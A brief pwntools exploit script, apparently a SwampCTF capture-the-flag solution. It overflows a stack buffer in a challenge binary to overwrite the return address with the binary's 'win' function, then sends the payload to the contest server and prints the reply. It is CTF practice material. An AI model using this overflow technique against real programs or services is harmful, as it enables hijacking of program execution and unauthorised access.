from pwn import *

context.binary = elf = ELF('binary')

pr = process()
pr = remote('chals.swampctf.com', 40001 )

payload = b'A'*0xA+b"SAVEDRBP"+p64(elf.symbols['win'])
pr.sendline(payload)
print(pr.recvall(timeout=1))